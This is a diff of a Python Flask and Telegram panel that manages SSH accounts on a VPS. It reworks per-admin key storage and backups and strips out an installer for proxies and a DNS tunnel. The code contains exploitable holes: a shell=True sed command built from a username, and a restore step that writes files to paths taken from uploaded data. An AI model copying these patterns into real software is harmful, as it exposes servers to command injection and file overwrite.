         "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     }
-    save_keys(keys)
+    save_keys(keys, save_admin)
     
     if sync_user_to_system(username, password, expiry, limit):
         flash(f"✅ User '{username}' created successfully!", "success")
@@ -1750,24 +1763,33 @@ def gen_key():
         flash(f"⚠️ User created but sync failed!", "warning")
     return redirect(url_for('admin_dashboard'))
 
-@app.route('/edit_key/<key_id>', methods=['POST'])
+@app.route('/edit_key/<key>', methods=['POST'])
 @login_required
-def edit_key(key_id):
+def edit_key(key):
     valid, _, _ = check_license_from_github()
     if not valid:
         flash("License expired or invalid!", "danger")
         return redirect(url_for('logout'))
     
     current_telegram_id = current_user.telegram_id if hasattr(current_user, 'telegram_id') else None
+    is_super_admin = (current_telegram_id and str(current_telegram_id) == str(TELEGRAM_ADMIN_ID))
     
-    keys = load_keys()
-    if key_id not in keys:
-        flash("Key not found!", "danger")
-        return redirect(url_for('admin_dashboard'))
+    found_key = None
+    found_admin = None
     
-    # Check ownership
-    if str(keys[key_id].get('telegram_id')) != str(current_telegram_id):
-        flash("You don't have permission to edit this user!", "danger")
+    for filename in os.listdir(BASE_DIR):
+        if filename.endswith('.json') and filename not in ['authorized_tgids.json', 'active_sessions.json']:
+            admin_name = filename.replace('.json', '')
+            keys = load_keys(admin_name)
+            if key in keys:
+                created_by = keys[key].get('created_by_tgid') or keys[key].get('telegram_id')
+                if is_super_admin or str(created_by) == str(current_telegram_id):
+                    found_key = key
+                    found_admin = admin_name
+                    break
+    
+    if not found_key:
+        flash("Key not found or not authorized!", "danger")
         return redirect(url_for('admin_dashboard'))
     
     password = request.form.get('password', '').strip()
@@ -1777,56 +1799,75 @@ def edit_key(key_id):
         limit = 1
     expiry = request.form.get('expiry', '').strip()
     
+    keys = load_keys(found_admin)
     if password:
-        keys[key_id]['password'] = password
+        keys[found_key]['password'] = password
     if limit:
-        keys[key_id]['limit'] = limit
+        keys[found_key]['limit'] = limit
     if expiry:
-        keys[key_id]['expiry'] = expiry
+        keys[found_key]['expiry'] = expiry
     
-    save_keys(keys)
-    username = keys[key_id]['username']
-    sync_user_to_system(username, keys[key_id]['password'], keys[key_id]['expiry'], keys[key_id]['limit'])
+    save_keys(keys, found_admin)
+    username = keys[found_key]['username']
+    sync_user_to_system(username, keys[found_key]['password'], keys[found_key]['expiry'], keys[found_key]['limit'])
     flash(f"✅ User '{username}' updated successfully!", "success")
     return redirect(url_for('admin_dashboard'))
 
-@app.route('/delete/<key_id>')
+@app.route('/delete/<key>')
 @login_required
-def delete_key(key_id):
+def delete_key(key):
     valid, _, _ = check_license_from_github()
     if not valid:
         flash("License expired or invalid!", "danger")
         return redirect(url_for('logout'))
     
     current_telegram_id = current_user.telegram_id if hasattr(current_user, 'telegram_id') else None
+    is_super_admin = (current_telegram_id and str(current_telegram_id) == str(TELEGRAM_ADMIN_ID))
     
-    keys = load_keys()
-    if key_id not in keys:
-        flash("Key not found!", "danger")
+    found_key = None
+    found_admin = None
+    found_username = None
+    
+    for filename in os.listdir(BASE_DIR):
+        if filename.endswith('.json') and filename not in ['authorized_tgids.json', 'active_sessions.json']:
+            admin_name = filename.replace('.json', '')
+            keys = load_keys(admin_name)
+            if key in keys:
+                created_by = keys[key].get('created_by_tgid') or keys[key].get('telegram_id')
+                if is_super_admin or str(created_by) == str(current_telegram_id):
+                    found_key = key
+                    found_admin = admin_name
+                    found_username = keys[key].get('username')
+                    break
+    
+    if not found_key:
+        flash("Key not found or not authorized!", "danger")
         return redirect(url_for('admin_dashboard'))
     
-    # Check ownership
-    if str(keys[key_id].get('telegram_id')) != str(current_telegram_id):
-        flash("You don't have permission to delete this user!", "danger")
-        return redirect(url_for('admin_dashboard'))
+    if found_username:
+        subprocess.run(["userdel", "-f", found_username], capture_output=True)
+        subprocess.run(f"sed -i '/^{found_username} hard/d' /etc/security/limits.conf", shell=True, capture_output=True)
     
-    username = keys[key_id].get('username')
-    if username:
-        subprocess.run(["userdel", "-f", username], capture_output=True)
-        subprocess.run(f"sed -i '/^{username} hard/d' /etc/security/limits.conf", shell=True, capture_output=True)
+    keys = load_keys(found_admin)
+    if found_key in keys:
+        del keys[found_key]
+        save_keys(keys, found_admin)
     
-    del keys[key_id]
-    save_keys(keys)
-    
-    flash(f"✅ User '{username}' deleted successfully!", "success")
+    flash(f"✅ User '{found_username}' deleted successfully!", "success")
     return redirect(url_for('admin_dashboard'))
 
 @app.route('/backup_users')
 @login_required
 def backup_users():
     try:
-        keys = load_keys()
-        backup_json = json.dumps(keys, indent=4)
+        backup_data = {"files": {}}
+        for filename in os.listdir(BASE_DIR):
+            if filename.endswith('.json') and filename not in ['authorized_tgids.json', 'active_sessions.json']:
+                filepath = os.path.join(BASE_DIR, filename)
+                with open(filepath, "r") as f:
+                    backup_data["files"][filename] = json.load(f)
+        
+        backup_json = json.dumps(backup_data, indent=4)
         return send_file(
             io.BytesIO(backup_json.encode()),
             as_attachment=True,
@@ -1861,9 +1902,11 @@ def restore_users():
         content = file.read().decode('utf-8')
         restored_data = json.loads(content)
         
-        # Validate and save
-        if isinstance(restored_data, dict):
-            save_keys(restored_data)
+        if "files" in restored_data:
+            for filename, data in restored_data["files"].items():
+                filepath = os.path.join(BASE_DIR, filename)
+                with open(filepath, "w") as f:
+                    json.dump(data, f, indent=4)
         else:
             flash("Invalid backup format!", "danger")
             return redirect(url_for('admin_dashboard'))
@@ -1933,11 +1976,13 @@ def api_online_status():
         update_session_heartbeat(active_session_id)
     
     current_telegram_id = current_user.telegram_id if hasattr(current_user, 'telegram_id') else None
+    is_super_admin = (current_telegram_id and str(current_telegram_id) == str(TELEGRAM_ADMIN_ID))
     
-    all_keys = load_keys()
+    all_keys = load_keys(None)
     filtered_keys = {}
     for key, val in all_keys.items():
-        if str(val.get('telegram_id')) == str(current_telegram_id):
+        created_by = val.get('created_by_tgid') or val.get('telegram_id')
+        if is_super_admin or str(created_by) == str(current_telegram_id):
             filtered_keys[key] = val
     
     status_dict = {}
@@ -1978,497 +2023,70 @@ def api_online_status():
         'session_valid': (active_session_id in all_sessions if active_session_id else True)
     })
 
-# ============================================
-# SYSTEM DEPENDENCIES INSTALLATION
-# ============================================
-def run_command_hidden(cmd, description):
-    try:
-        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
-        return True
-    except:
-        return False
-
-def is_package_installed(package):
-    try:
-        result = subprocess.run(["dpkg", "-s", package], capture_output=True, text=True)
-        return result.returncode == 0
-    except:
-        return False
-
-def is_python_package_installed(package):
-    try:
-        __import__(package.replace("-", "_"))
-        return True
-    except ImportError:
-        return False
-
 def install_system_dependencies():
-    system_packages = [
-        "python3-pip", "net-tools", "ssh", "dropbear", "stunnel4", 
-        "openvpn", "squid", "curl", "wget", "iptables", "screen", "ufw"
-    ]
-    
-    python_packages = ["flask", "flask-login", "requests", "waitress", "werkzeug"]
-    
-    missing_system = []
-    for pkg in system_packages:
-        if not is_package_installed(pkg):
-            missing_system.append(pkg)
-    
-    missing_python = []
-    for pkg in python_packages:
-        if not is_python_package_installed(pkg):
-            missing_python.append(pkg)
-    
-    if missing_system:
-        run_command_hidden("apt-get update -y", "Updating system")
-        for pkg in missing_system:
-            run_command_hidden(f"apt-get install -y {pkg}", f"Installing {pkg}")
-    
-    if missing_python:
-        run_command_hidden("pip3 install --upgrade " + " ".join(missing_python), "Installing Python packages")
-    
-    return True
-
-# ============================================
-# UTILITY FUNCTIONS
-# ============================================
-def safe_write_file(filepath, content):
-    try:
-        with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
-            f.write(content)
-        return True
-    except:
-        return False
-
-def safe_read_file(filepath):
-    try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            return f.read()
-    except:
-        return ""
-
-def clean_domain_input(input_str):
-    if not input_str:
-        return ""
-    cleaned = re.sub(r'[^\x00-\x7F]+', '', input_str)
-    cleaned = re.sub(r'[^a-zA-Z0-9\.\-]', '', cleaned)
-    return cleaned.strip()
-
-# ============================================
-# DOMAIN CONFIGURATION
-# ============================================
-def ask_domain():
-    print(f"\n{YELLOW}[1/4] DOMAIN CONFIGURATION{NC}")
-    print(f"{CYAN}────────────────────────────────────────────────────────────{NC}")
-    
-    domain = input(f" ◇ Enter your DOMAIN (Default: evtvip.com): ").strip()
-    domain = clean_domain_input(domain)
-    if not domain:
-        domain = "evtvip.com"
-    
-    ns_domain = input(f" ◇ Enter your NAMESERVER (Default: ns.evtvip.com): ").strip()
-    ns_domain = clean_domain_input(ns_domain)
-    if not ns_domain:
-        ns_domain = "ns.evtvip.com"
-    
-    os.makedirs("/etc", exist_ok=True)
-    config_content = f'DOMAIN="{domain}"\nNS_DOMAIN="{ns_domain}"\n'
-    
-    if safe_write_file("/etc/evt_config", config_content):
-        print(f"\n{GREEN}✓ DOMAIN saved: {domain}{NC}")
-        print(f"{GREEN}✓ NS DOMAIN saved: {ns_domain}{NC}")
-    else:
-        print(f"{RED}✗ Failed to save config{NC}")
-    
-    print(f"{CYAN}────────────────────────────────────────────────────────────{NC}")
-    time.sleep(1)
-    return domain, ns_domain
-
-# ============================================
-# PORT MANAGER FUNCTIONS
-# ============================================
-def setup_squid_proxy():
-    run_command_hidden("systemctl stop squid", "")
-    run_command_hidden("systemctl stop squid3", "")
-    run_command_hidden("pkill -f squid", "")
-    
-    squid_conf = '''# Squid proxy configuration
-http_port 8080
-http_port 3128
-
-acl all src 0.0.0.0/0
-http_access allow all
-
-cache deny all
-
-maximum_object_size_in_memory 512 KB
-memory_replacement_policy heap GDSF
-cache_replacement_policy heap LFUDA
-
-connect_timeout 30 seconds
-read_timeout 60 seconds
-request_timeout 30 seconds
-client_lifetime 24 hours
-
-dns_nameservers 8.8.8.8 8.8.4.4
-
-access_log /var/log/squid/access.log
-cache_log /var/log/squid/cache.log
-
-forwarded_for delete
-request_header_access X-Forwarded-For deny all
-request_header_access Via deny all
-
-via off
-'''
-    
-    os.makedirs("/etc/squid", exist_ok=True)
-    safe_write_file("/etc/squid/squid.conf", squid_conf)
-    
-    os.makedirs("/var/spool/squid", exist_ok=True)
-    run_command_hidden("chown -R proxy:proxy /var/spool/squid", "")
-    run_command_hidden("chown -R proxy:proxy /var/log/squid", "")
-    run_command_hidden("squid -z", "")
-    time.sleep(1)
-    
-    run_command_hidden("systemctl start squid", "")
-    time.sleep(2)
-    
-    result = subprocess.run(["systemctl", "is-active", "squid"], capture_output=True, text=True)
-    if "active" not in result.stdout:
-        run_command_hidden("squid -f /etc/squid/squid.conf", "")
-        time.sleep(2)
-    
-    for port in [8080, 3128]:
-        run_command_hidden(f"iptables -A INPUT -p tcp --dport {port} -j ACCEPT", "")
-    
-    print(f"{GREEN}   ✓ SQUID PROXY running on ports 8080 and 3128{NC}")
-
-def run_port_manager_auto():
-    print(f"\n{YELLOW}[2/4] PORT MANAGER - Auto Setup{NC}")
-    print(f"{CYAN}────────────────────────────────────────────────────────────{NC}")
-    
-    # PROXY SOCKS on port 2052
-    run_command_hidden("pkill -f proxy_2052", "")
-    run_command_hidden("fuser -k 2052/tcp", "")
-    
-    proxy_script = '''import socket, threading, select
-def forward(source, destination):
-    string_list = [source, destination]
-    while True:
-        read_list, _, _ = select.select(string_list, [], [], 10)
-        if not read_list: continue
-        for sock in read_list:
-            try:
-                data = sock.recv(16384)
-                if not data: return
-                if sock is source: destination.sendall(data)
-                else: source.sendall(data)
-            except: return
-def handler(client, address):
-    try:
-        header = client.recv(16384).decode('utf-8', errors='ignore')
-        target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        target.connect(('127.0.0.1', 22))
-        if "Upgrade: websocket" in header or "GET" in header or "CONNECT" in header:
-            client.sendall(b"HTTP/1.1 101 Switching Protocols\\r\\nUpgrade: websocket\\r\\nConnection: Upgrade\\r\\n\\r\\n")
-        forward(client, target)
-    except: pass
-    finally: client.close()
-def main():
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server.bind(('0.0.0.0', 2052))
-    server.listen(1000)
-    while True:
-        client, address = server.accept()
-        threading.Thread(target=handler, args=(client, address), daemon=True).start()
-if __name__ == '__main__':
-    main()
-'''
-    
-    os.makedirs("/usr/local/bin", exist_ok=True)
-    safe_write_file("/usr/local/bin/proxy_2052.py", proxy_script)
-    os.chmod("/usr/local/bin/proxy_2052.py", 0o755)
-    run_command_hidden("screen -dmS proxy_2052 python3 /usr/local/bin/proxy_2052.py", "")
-    time.sleep(2)
-    
-    print(f"{GREEN}   ✓ PROXY SOCKS running on port 2052{NC}")
-    
-    # SQUID PROXY
-    setup_squid_proxy()
-    
-    # DROPBEAR on ports 143 and 110
-    run_command_hidden("killall dropbear", "")
-    run_command_hidden("pkill -x dropbear", "")
-    run_command_hidden("systemctl stop dropbear", "")
-    time.sleep(1)
-    
-    os.makedirs("/etc/dropbear", exist_ok=True)
-    os.makedirs("/var/run/dropbear", exist_ok=True)
-    
-    if not os.path.exists("/etc/dropbear/dropbear_rsa_host_key"):
-        run_command_hidden("dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key -s 2048", "")
-    if not os.path.exists("/etc/dropbear/dropbear_dss_host_key"):
-        run_command_hidden("dropbearkey -t dss -f /etc/dropbear/dropbear_dss_host_key", "")
-    if not os.path.exists("/etc/dropbear/dropbear_ecdsa_host_key"):
-        run_command_hidden("dropbearkey -t ecdsa -f /etc/dropbear/dropbear_ecdsa_host_key -s 521", "")
-    
-    run_command_hidden("dropbear -p 143 -p 110 -R", "")
-    time.sleep(2)
-    
-    print(f"{GREEN}   ✓ DROPBEAR running on ports 143 and 110{NC}")
-    
-    # SSL TUNNEL on port 443
-    run_command_hidden("systemctl stop stunnel4", "")
-    run_command_hidden("pkill -f stunnel", "")
-    
-    os.makedirs("/etc/stunnel", exist_ok=True)
-    
-    run_command_hidden("openssl genrsa -out /etc/stunnel/stunnel.key 2048", "")
-    run_command_hidden("openssl req -new -x509 -key /etc/stunnel/stunnel.key -out /etc/stunnel/stunnel.crt -days 1095 -subj /CN=SSHPLUS", "")
-    
-    stunnel_pem = ""
-    with open("/etc/stunnel/stunnel.key", "r") as key:
-        stunnel_pem += key.read()
-    with open("/etc/stunnel/stunnel.crt", "r") as crt:
-        stunnel_pem += crt.read()
-    safe_write_file("/etc/stunnel/stunnel.pem", stunnel_pem)
-    
-    stunnel_conf = '''cert = /etc/stunnel/stunnel.pem
-client = no
-socket = a:SO_REUSEADDR=1
-socket = l:TCP_NODELAY=1
-socket = r:TCP_NODELAY=1
-[ssh]
-accept = 443
-connect = 127.0.0.1:22
-'''
-    safe_write_file("/etc/stunnel/stunnel.conf", stunnel_conf)
-    
-    run_command_hidden("sed -i 's/ENABLED=0/ENABLED=1/g' /etc/default/stunnel4", "")
-    run_command_hidden("systemctl restart stunnel4", "")
-    time.sleep(2)
-    
-    print(f"{GREEN}   ✓ SSL TUNNEL running on port 443{NC}")
-    
-    # Firewall rules
-    ports = [2052, 8080, 3128, 143, 110, 443]
-    for port in ports:
-        run_command_hidden(f"iptables -A INPUT -p tcp --dport {port} -j ACCEPT", "")
-    
-    run_command_hidden("iptables-save > /etc/iptables/rules.v4", "")
-    
-    print(f"{GREEN}────────────────────────────────────────────────────────────{NC}")
-    print(f"{GREEN}[✓] PORT MANAGER AUTO SETUP COMPLETED!{NC}")
-    print(f"{CYAN}   - PROXY SOCKS  : port 2052{NC}")
-    print(f"{CYAN}   - SQUID PROXY  : ports 8080, 3128{NC}")
-    print(f"{CYAN}   - DROPBEAR     : ports 143, 110{NC}")
-    print(f"{CYAN}   - SSL TUNNEL   : port 443{NC}")
-    print(f"{GREEN}────────────────────────────────────────────────────────────{NC}")
-    time.sleep(2)
-
-# ============================================
-# SLOWDNS FUNCTIONS
-# ============================================
-def get_primary_interface():
-    result = subprocess.run(["ip", "route", "|", "grep", "default"], 
-                           capture_output=True, text=True, shell=True)
-    if result.stdout:
-        parts = result.stdout.split()
-        if len(parts) >= 5:
-            return parts[4]
-    return "eth0"
-
-def detect_ssh_port():
-    result = subprocess.run(["ss", "-tlnp", "|", "grep", "sshd"], 
-                           capture_output=True, text=True, shell=True)
-    if result.stdout:
-        match = re.search(r':(\d+)', result.stdout)
-        if match:
-            return match.group(1)
-    return "22"
-
-def run_slowdns_auto():
-    print(f"\n{YELLOW}[3/4] SLOWDNS MANAGER - Full Auto Setup{NC}")
-    print(f"{CYAN}────────────────────────────────────────────────────────────{NC}")
-    
-    ns_domain = "ns.evtvip.com"
-    if os.path.exists("/etc/evt_config"):
-        config_content = safe_read_file("/etc/evt_config")
-        for line in config_content.splitlines():
-            if "NS_DOMAIN" in line:
-                ns_domain = line.split("=")[1].strip().strip('"')
-                break
-    
-    print(f"{CYAN}   ➤ Using NS Domain: {ns_domain}{NC}")
-    
-    run_command_hidden("apt-get install -y curl wget dnsutils", "")
-    
-    arch = os.uname().machine
-    if arch == "x86_64":
-        arch = "amd64"
-    elif arch in ["aarch64", "arm64"]:
-        arch = "arm64"
-    elif arch in ["armv7l", "armv6l"]:
-        arch = "arm"
-    else:
-        arch = "amd64"
-    
-    dnstt_base_url = "https://dnstt.network"
-    filename = f"dnstt-server-linux-{arch}"
-    filepath = f"/usr/local/bin/dnstt-server"
-    
-    run_command_hidden(f"curl -L -o /tmp/{filename} {dnstt_base_url}/{filename}", "")
-    run_command_hidden(f"chmod +x /tmp/{filename}", "")
-    run_command_hidden(f"mv /tmp/{filename} {filepath}", "")
-    
-    if not os.path.exists(filepath):
-        print(f"{RED}   ✗ Failed to download dnstt-server{NC}")
-        return ""
-    
-    run_command_hidden("useradd -r -s /bin/false -d /nonexistent dnstt", "")
-    
-    config_dir = "/etc/dnstt"
-    os.makedirs(config_dir, exist_ok=True)
-    
-    key_prefix = ns_domain.replace(".", "_")
-    private_key_file = f"{config_dir}/{key_prefix}_server.key"
-    public_key_file = f"{config_dir}/{key_prefix}_server.pub"
-    
-    run_command_hidden(f"{filepath} -gen-key -privkey-file {private_key_file} -pubkey-file {public_key_file}", "")
-    
-    run_command_hidden(f"chown -R dnstt:dnstt {config_dir}", "")
-    run_command_hidden(f"chmod 600 {private_key_file}", "")
-    run_command_hidden(f"chmod 644 {public_key_file}", "")
-    
-    interface = get_primary_interface()
-    dnstt_port = "5300"
-    
-    run_command_hidden(f"iptables -I INPUT -p udp --dport {dnstt_port} -j ACCEPT", "")
-    run_command_hidden(f"iptables -t nat -I PREROUTING -i {interface} -p udp --dport 53 -j REDIRECT --to-ports {dnstt_port}", "")
-    
-    os.makedirs("/etc/iptables", exist_ok=True)
-    run_command_hidden("iptables-save > /etc/iptables/rules.v4", "")
-    
-    ssh_port = detect_ssh_port()
-    
-    service_content = f'''[Unit]
-Description=dnstt DNS Tunnel Server
-After=network.target
-Wants=network.target
-
-[Service]
-Type=simple
-User=dnstt
-Group=dnstt
-ExecStart={filepath} -udp :{dnstt_port} -privkey-file {private_key_file} -mtu 1232 {ns_domain} 127.0.0.1:{ssh_port}
-Restart=always
-RestartSec=5
-KillMode=mixed
-TimeoutStopSec=5
-
-NoNewPrivileges=true
-ProtectSystem=strict
-ProtectHome=true
-PrivateTmp=true
-
-[Install]
-WantedBy=multi-user.target
-'''
-    
-    safe_write_file("/etc/systemd/system/dnstt-server.service", service_content)
-    
-    run_command_hidden("systemctl daemon-reload", "")
-    run_command_hidden("systemctl enable dnstt-server", "")
-    run_command_hidden("systemctl start dnstt-server", "")
-    time.sleep(3)
-    
-    dns_pub_key = ""
-    if os.path.exists(public_key_file):
-        dns_pub_key = safe_read_file(public_key_file).strip()
-    
-    print(f"{GREEN}────────────────────────────────────────────────────────────{NC}")
-    
-    result = subprocess.run(["systemctl", "is-active", "dnstt-server"], capture_output=True, text=True)
-    if "active" in result.stdout:
-        print(f"{GREEN}[✓] SLOWDNS AUTO SETUP COMPLETED!{NC}")
-        print(f"{CYAN}   - NS Domain : {ns_domain}{NC}")
-        print(f"{CYAN}   - Listen Port: {dnstt_port} (DNS redirected from port 53){NC}")
-        if dns_pub_key:
-            print(f"{CYAN}   - Public Key: {WHITE}{dns_pub_key}{NC}")
-    else:
-        print(f"{YELLOW}[⚠️] Service may need manual check{NC}")
-    
-    print(f"{GREEN}────────────────────────────────────────────────────────────{NC}")
-    time.sleep(2)
-    
-    return dns_pub_key
-
-# ============================================
-# VERIFICATION & SUMMARY
-# ============================================
-def check_all_ports():
-    print(f"\n{YELLOW}[4/4] Verifying All Services{NC}")
-    print(f"{CYAN}────────────────────────────────────────────────────────────{NC}")
-    
-    result = subprocess.run(["netstat", "-tunlp"], capture_output=True, text=True)
-    
-    services = {
-        "PROXY SOCKS": "2052",
-        "SQUID": "8080|3128",
-        "DROPBEAR": "143|110",
-        "SSL TUNNEL": "443",
-        "SLOWDNS": "5300"
-    }
-    
-    for service, ports in services.items():
-        found = False
-        for port in ports.split("|"):
-            if port in result.stdout:
-                found = True
-                break
-        if found:
-            print(f"{GREEN}   ✓ {service} is running{NC}")
-        else:
-            print(f"{YELLOW}   ⚠ {service} may need check{NC}")
-    
-    pub_files = glob.glob("/etc/dnstt/*.pub")
-    for pub_file in pub_files:
-        pub_key = safe_read_file(pub_file).strip()
-        if pub_key:
-            print(f"\n{GREEN}   ✓ SLOWDNS Public Key:{NC}")
-            print(f"   {WHITE}{pub_key}{NC}")
+    packages = ["python3-pip", "net-tools", "ssh", "dropbear", "stunnel4", "openvpn", "squid", "curl", "wget"]
+    
+    needs_install = False
+    for pkg in packages:
+        check = subprocess.run(["dpkg", "-s", pkg], capture_output=True)
+        if check.returncode != 0:
+            needs_install = True
             break
     
-    print(f"{GREEN}────────────────────────────────────────────────────────────{NC}")
+    try:
+        import flask
+    except ImportError:
+        needs_install = True
+    
+    if needs_install:
+        print("\n" + "="*50)
+        print("[🚀] INITIALIZING VPS SETUP")
+        print("="*50)
+        try:
+            stop_event = threading.Event()
+            t = threading.Thread(target=loading_animation, args=(stop_event, "Updating system repositories..."))
+            t.start()
+            subprocess.run(["sudo", "apt-get", "update", "-y"], capture_output=True)
+            stop_event.set()
+            t.join()
+            print("[✅] System repositories updated.")
+            
+            for pkg in packages:
+                check = subprocess.run(["dpkg", "-s", pkg], capture_output=True)
+                if check.returncode != 0:
+                    stop_event = threading.Event()
+                    t = threading.Thread(target=loading_animation, args=(stop_event, f"Installing {pkg}..."))
+                    t.start()
+                    subprocess.run(["sudo", "apt-get", "install", "-y", pkg], capture_output=True)
+                    stop_event.set()
+                    t.join()
+                    print(f"[✅] {pkg} installed.")
+            
+            stop_event = threading.Event()
+            t = threading.Thread(target=loading_animation, args=(stop_event, "Installing python requirements..."))
+            t.start()
+            subprocess.run(["sudo", "pip3", "install", "flask", "flask-login", "requests", "waitress", "werkzeug"], capture_output=True)
+            stop_event.set()
+            t.join()
+            print("[✅] Python requirements installed.")
+            
+            print("\n" + "="*50)
+            print("[🎉] SETUP COMPLETE! RESTARTING SCRIPT...")
+            print("="*50 + "\n")
+            os.execv(sys.executable, ['python3'] + sys.argv)
+        except Exception as e:
+            print(f"\n[❌] Error during setup: {e}")
 
-def final_summary(domain, ns_domain, pub_key=""):
-    print(f"\n{CYAN}════════════════════════════════════════════════════════════{NC}")
-    print(f"{GREEN}🎉 ALL AUTO SETUP COMPLETED SUCCESSFULLY!{NC}")
-    print(f"{CYAN}════════════════════════════════════════════════════════════{NC}")
-    print(f"\n{YELLOW}📋 SETUP SUMMARY:{NC}")
-    print(f"   • DOMAIN         : {domain}")
-    print(f"   • NS DOMAIN      : {ns_domain}")
-    print(f"   • PROXY SOCKS    : port 2052")
-    print(f"   • SQUID PROXY    : ports 8080, 3128")
-    print(f"   • DROPBEAR       : ports 143, 110")
-    print(f"   • SSL TUNNEL     : port 443")
-    print(f"   • SLOWDNS        : Installed & Running on port 5300")
-    
-    if pub_key:
-        print(f"\n{YELLOW}📌 SLOWDNS PUBLIC KEY:{NC}")
-        print(f"   {WHITE}{pub_key}{NC}")
-    
-    print(f"\n{YELLOW}📌 Management Commands:{NC}")
-    print(f"   • SlowDNS status : systemctl status dnstt-server")
-    print(f"   • SlowDNS logs   : journalctl -u dnstt-server -f")
-    print(f"   • Squid status   : systemctl status squid")
-    print(f"   • Dropbear status: pgrep -x dropbear")
-    
-    print(f"\n{GREEN}✅ Server is ready for use!{NC}")
-    print("")
+def loading_animation(stop_event, message):
+    chars = ["▖", "▘", "▝", "▗"]
+    i = 0
+    while not stop_event.is_set():
+        sys.stdout.write(f"\r[⏳] {message} {chars[i % len(chars)]} ")
+        sys.stdout.flush()
+        time.sleep(0.2)
+        i += 1
+    sys.stdout.write("\r" + " " * (len(message) + 10) + "\r")
+    sys.stdout.flush()
 
 # ===== SOURCE CODE PROTECTION FUNCTION (ZIVPN STYLE) =====
 def run_protection_in_background():
@@ -2504,12 +2122,11 @@ def run_protection_in_background():
     t = threading.Thread(target=protect, daemon=True)
     t.start()
     print("[🔐] Source code protection scheduled (will run in 30 seconds)")
-# ============================================
-# START APPLICATION
-# ============================================
+
 if __name__ == '__main__':
     import io
-    #run_protection_in_background() 
+    install_system_dependencies()
+    
     print("\n" + "="*60)
     print("🔐 EVT SSH MANAGER")
     print("="*60)
@@ -2531,41 +2148,28 @@ if __name__ == '__main__':
         synced, errors = sync_all_users_to_system()
         print(f"[✅] Synced {synced} users")
     
-    # Start Telegram bot thread
     telegram_thread = threading.Thread(target=run_telegram_bot, daemon=True)
     telegram_thread.start()
-    print("[✅] Telegram Bot started successfully!")
-    print(f"[🤖] Bot username: @{TELEGRAM_BOT_USERNAME}")
+    print("[✅] Telegram Bot started!")
     
-    # Start auto limit checker thread
     limit_check_thread = threading.Thread(target=auto_limit_check, daemon=True)
     limit_check_thread.start()
     print("[✅] Auto limit checker started!")
     
-    # Start duplicate VPS cleanup thread
-    cleanup_thread = threading.Thread(target=auto_cleanup_duplicate_vps, daemon=True)
-    cleanup_thread.start()
-    print("[✅] Auto cleanup checker started!")
-# ===== START SOURCE CODE PROTECTION IN BACKGROUND =====
-       
+    # ===== START SOURCE CODE PROTECTION IN BACKGROUND =====
+    run_protection_in_background()
+    
     vps_ip = get_vps_ip()
     print("\n" + "="*60)
     print("[✅] EVT SSH MANAGER STARTED SUCCESSFULLY!")
-    print(f"[🌐] Web Panel: http://{vps_ip}:5000")
+    print(f"[🌐] Web Panel: http://{vps_ip}:5001")
     print("[🤖] Telegram Bot is running...")
+    print("[🔐] Source code will be protected automatically in 30 seconds")
     print("="*60)
-    #install_system_dependencies()
-    
-    # Setup ports and slowdns
-    #domain, ns_domain = ask_domain()
-    #run_port_manager_auto()
-    #pub_key = run_slowdns_auto()
-    #check_all_ports()
-    #final_summary(domain, ns_domain, pub_key)
     
     try:
         from waitress import serve
-        serve(app, host='0.0.0.0', port=5000, threads=4, _quiet=True)
+        serve(app, host='0.0.0.0', port=5001, threads=4, _quiet=True)
     except ImportError:
         from werkzeug.serving import run_simple
         run_simple('0.0.0.0', 5001, app, use_reloader=False, threaded=True)
